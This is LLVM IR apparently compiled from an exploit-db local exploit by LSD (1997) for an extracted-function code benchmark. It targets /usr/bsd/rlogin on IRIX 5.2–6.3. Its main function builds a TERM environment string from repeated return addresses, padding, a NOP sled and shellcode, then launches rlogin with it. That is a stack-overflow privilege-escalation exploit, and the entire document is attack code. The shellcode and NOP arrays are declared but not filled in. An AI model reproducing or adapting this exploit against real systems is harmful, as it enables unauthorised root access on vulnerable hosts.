; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/unix/local/extr_19203.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/unix/local/extr_19203.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@.str = private unnamed_addr constant [65 x i8] c"copyright LAST STAGE OF DELIRIUM oct 1997 poland  //lsd-pl.net/\0A\00", align 1
@.str.1 = private unnamed_addr constant [64 x i8] c"/usr/bsd/rlogin for irix 5.2 5.3 6.2 6.3 IP:17,19,20,21,22,32\0A\0A\00", align 1
@jump = common dso_local global i64 0, align 8
@.str.2 = private unnamed_addr constant [6 x i8] c"TERM=\00", align 1
@ADRNUM = common dso_local global i32 0, align 4
@ALLIGN = common dso_local global i32 0, align 4
@NOPNUM = common dso_local global i32 0, align 4
@nop = common dso_local global i32* null, align 8
@shellcode = common dso_local global i32* null, align 8
@.str.3 = private unnamed_addr constant [16 x i8] c"/usr/bsd/rlogin\00", align 1
@.str.4 = private unnamed_addr constant [7 x i8] c"rlogin\00", align 1
@.str.5 = private unnamed_addr constant [10 x i8] c"localhost\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca [10000 x i8], align 16
  %7 = alloca [4 x i8], align 1
  %8 = alloca i8*, align 8
  %9 = alloca [2 x i8*], align 16
  %10 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %11 = call i32 @printf(i8* getelementptr inbounds ([65 x i8], [65 x i8]* @.str, i64 0, i64 0))
  %12 = call i32 @printf(i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.1, i64 0, i64 0))
  %13 = load i64, i64* @jump, align 8
  %14 = inttoptr i64 %13 to i64 (...)*
  %15 = call i64 (...) %14()
  %16 = add i64 %15, 10288
  %17 = add i64 %16, 7000
  %18 = getelementptr inbounds [4 x i8], [4 x i8]* %7, i64 0, i64 0
  %19 = bitcast i8* %18 to i64*
  store i64 %17, i64* %19, align 1
  %20 = getelementptr inbounds [10000 x i8], [10000 x i8]* %6, i64 0, i64 0
  %21 = getelementptr inbounds [2 x i8*], [2 x i8*]* %9, i64 0, i64 0
  store i8* %20, i8** %21, align 16
  %22 = getelementptr inbounds [2 x i8*], [2 x i8*]* %9, i64 0, i64 1
  store i8* null, i8** %22, align 8
  %23 = getelementptr inbounds [10000 x i8], [10000 x i8]* %6, i64 0, i64 0
  store i8* %23, i8** %8, align 8
  %24 = load i8*, i8** %8, align 8
  %25 = call i32 @sprintf(i8* %24, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.2, i64 0, i64 0))
  %26 = load i8*, i8** %8, align 8
  %27 = getelementptr inbounds i8, i8* %26, i64 5
  store i8* %27, i8** %8, align 8
  store i32 0, i32* %10, align 4
  br label %28

28:                                               ; preds = %40, %2
  %29 = load i32, i32* %10, align 4
  %30 = load i32, i32* @ADRNUM, align 4
  %31 = icmp slt i32 %29, %30
  br i1 %31, label %32, label %43

32:                                               ; preds = %28
  %33 = load i32, i32* %10, align 4
  %34 = srem i32 %33, 4
  %35 = sext i32 %34 to i64
  %36 = getelementptr inbounds [4 x i8], [4 x i8]* %7, i64 0, i64 %35
  %37 = load i8, i8* %36, align 1
  %38 = load i8*, i8** %8, align 8
  %39 = getelementptr inbounds i8, i8* %38, i32 1
  store i8* %39, i8** %8, align 8
  store i8 %37, i8* %38, align 1
  br label %40

40:                                               ; preds = %32
  %41 = load i32, i32* %10, align 4
  %42 = add nsw i32 %41, 1
  store i32 %42, i32* %10, align 4
  br label %28

43:                                               ; preds = %28
  store i32 0, i32* %10, align 4
  br label %44

44:                                               ; preds = %51, %43
  %45 = load i32, i32* %10, align 4
  %46 = load i32, i32* @ALLIGN, align 4
  %47 = icmp slt i32 %45, %46
  br i1 %47, label %48, label %54

48:                                               ; preds = %44
  %49 = load i8*, i8** %8, align 8
  %50 = getelementptr inbounds i8, i8* %49, i32 1
  store i8* %50, i8** %8, align 8
  store i8 -1, i8* %49, align 1
  br label %51

51:                                               ; preds = %48
  %52 = load i32, i32* %10, align 4
  %53 = add nsw i32 %52, 1
  store i32 %53, i32* %10, align 4
  br label %44

54:                                               ; preds = %44
  store i32 0, i32* %10, align 4
  br label %55

55:                                               ; preds = %69, %54
  %56 = load i32, i32* %10, align 4
  %57 = load i32, i32* @NOPNUM, align 4
  %58 = icmp slt i32 %56, %57
  br i1 %58, label %59, label %72

59:                                               ; preds = %55
  %60 = load i32*, i32** @nop, align 8
  %61 = load i32, i32* %10, align 4
  %62 = srem i32 %61, 4
  %63 = sext i32 %62 to i64
  %64 = getelementptr inbounds i32, i32* %60, i64 %63
  %65 = load i32, i32* %64, align 4
  %66 = trunc i32 %65 to i8
  %67 = load i8*, i8** %8, align 8
  %68 = getelementptr inbounds i8, i8* %67, i32 1
  store i8* %68, i8** %8, align 8
  store i8 %66, i8* %67, align 1
  br label %69

69:                                               ; preds = %59
  %70 = load i32, i32* %10, align 4
  %71 = add nsw i32 %70, 1
  store i32 %71, i32* %10, align 4
  br label %55

72:                                               ; preds = %55
  store i32 0, i32* %10, align 4
  br label %73

73:                                               ; preds = %87, %72
  %74 = load i32, i32* %10, align 4
  %75 = load i32*, i32** @shellcode, align 8
  %76 = call i32 @strlen(i32* %75)
  %77 = icmp slt i32 %74, %76
  br i1 %77, label %78, label %90

78:                                               ; preds = %73
  %79 = load i32*, i32** @shellcode, align 8
  %80 = load i32, i32* %10, align 4
  %81 = sext i32 %80 to i64
  %82 = getelementptr inbounds i32, i32* %79, i64 %81
  %83 = load i32, i32* %82, align 4
  %84 = trunc i32 %83 to i8
  %85 = load i8*, i8** %8, align 8
  %86 = getelementptr inbounds i8, i8* %85, i32 1
  store i8* %86, i8** %8, align 8
  store i8 %84, i8* %85, align 1
  br label %87

87:                                               ; preds = %78
  %88 = load i32, i32* %10, align 4
  %89 = add nsw i32 %88, 1
  store i32 %89, i32* %10, align 4
  br label %73

90:                                               ; preds = %73
  %91 = load i8*, i8** %8, align 8
  store i8 0, i8* %91, align 1
  %92 = getelementptr inbounds [2 x i8*], [2 x i8*]* %9, i64 0, i64 0
  %93 = call i32 @execle(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.3, i64 0, i64 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.4, i64 0, i64 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.5, i64 0, i64 0), i32 0, i8** %92)
  %94 = load i32, i32* %3, align 4
  ret i32 %94
}

declare dso_local i32 @printf(i8*) #1

declare dso_local i32 @sprintf(i8*, i8*) #1

declare dso_local i32 @strlen(i32*) #1

declare dso_local i32 @execle(i8*, i8*, i8*, i32, i8**) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
